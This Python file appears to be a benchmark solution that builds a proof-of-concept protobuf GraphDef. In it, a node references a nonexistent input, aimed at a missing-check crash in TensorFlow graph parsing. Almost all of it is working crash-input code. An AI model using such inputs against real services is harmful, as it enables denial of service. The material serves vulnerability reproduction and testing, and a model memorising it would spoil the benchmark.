import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        The vulnerability corresponds to a missing check in 'node_id_map' lookup 
        during GraphDef parsing (likely in TensorFlow Profiler/Trace events).
        The PoC is a GraphDef Protobuf with a node referencing a non-existent input node.
        """
        
        def encode_varint(n):
            if n == 0:
                return b'\x00'
            parts = []
            while n > 0:
                part = n & 0x7F
                n >>= 7
                if n > 0:
                    part |= 0x80
                parts.append(part)
            return bytes(parts)

        def encode_string_field(field_num, value):
            # Wire type 2 for Length Delimited
            tag = (field_num << 3) | 2
            val_bytes = value.encode('utf-8')
            return encode_varint(tag) + encode_varint(len(val_bytes)) + val_bytes

        # Construct NodeDef
        # Field 1: name (string)
        # Field 2: op (string)
        # Field 3: input (repeated string)
        
        # We create a node named "A" with op "NoOp" that inputs "B".
        # "B" is not defined in the graph, triggering the map lookup failure.
        node_def = b''
        node_def += encode_string_field(1, "A")
        node_def += encode_string_field(2, "NoOp")
        node_def += encode_string_field(3, "B") # Missing reference

        # Construct GraphDef
        # Field 1: node (repeated NodeDef)
        # Field 3: version (int32) - strictly not required to trigger crash but good for validity
        
        graph_def = b''
        
        # Add version = 1
        # Field 3, Wire type 0 (Varint)
        graph_def += encode_varint((3 << 3) | 0) + encode_varint(1)
        
        # Add node
        # Field 1, Wire type 2 (Length Delimited)
        graph_def += encode_varint((1 << 3) | 2)
        graph_def += encode_varint(len(node_def))
        graph_def += node_def
        
        return graph_def
